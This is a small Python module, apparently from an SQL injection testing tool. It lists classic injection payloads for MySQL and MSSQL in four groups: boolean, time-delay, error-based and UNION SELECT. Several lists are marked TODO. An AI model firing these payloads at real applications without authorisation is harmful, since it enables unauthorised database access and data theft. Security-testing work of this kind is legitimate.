"""
SQL Injection payload generator module
"""
from typing import List, Dict
from dataclasses import dataclass

@dataclass
class Payload:
    """SQL Injection payload data class"""
    value: str
    type: str
    description: str
    dbms: str

class PayloadGenerator:
    """SQL Injection payload generator class"""
    
    @staticmethod
    def get_boolean_payloads() -> List[Payload]:
        """Generate boolean-based SQL injection payloads"""
        payloads = [
            Payload("' OR '1'='1", "boolean", "Basic OR injection", "generic"),
            Payload("' OR 1=1 --", "boolean", "OR injection with comment", "generic"),
            # TODO: Add more boolean payloads
        ]
        return payloads
    
    @staticmethod
    def get_time_payloads() -> List[Payload]:
        """Generate time-based SQL injection payloads"""
        payloads = [
            Payload("'; WAITFOR DELAY '0:0:5' --", "time", "WAITFOR DELAY injection", "mssql"),
            Payload("'; SELECT SLEEP(5) --", "time", "SLEEP injection", "mysql"),
            # TODO: Add more time-based payloads
        ]
        return payloads
    
    @staticmethod
    def get_error_payloads() -> List[Payload]:
        """Generate error-based SQL injection payloads"""
        payloads = [
            Payload("' AND 1=CONVERT(int,@@version) --", "error", "Type conversion error", "mssql"),
            Payload("' AND extractvalue(rand(),concat(0x3a,version())) --", "error", "XPATH error", "mysql"),
            # TODO: Add more error-based payloads
        ]
        return payloads
    
    @staticmethod
    def get_union_payloads() -> List[Payload]:
        """Generate UNION-based SQL injection payloads"""
        payloads = [
            Payload("' UNION SELECT NULL--", "union", "Basic UNION injection", "generic"),
            Payload("' UNION SELECT NULL,NULL--", "union", "Two column UNION injection", "generic"),
            # TODO: Add more UNION payloads
        ]
        return payloads 